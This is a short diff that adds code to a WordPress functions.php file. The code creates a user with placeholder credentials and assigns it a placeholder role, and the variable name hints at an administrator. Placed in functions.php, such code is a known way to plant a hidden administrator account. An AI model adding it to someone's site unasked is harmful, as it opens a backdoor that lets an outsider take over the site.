@@ -1,0 +1,5 @@
+
+//add functions.php
+	$create_user= wp_create_user('username','password','email');
+	$administor = new WP_User($create_user);
+	$administor -> set_role('user-type');
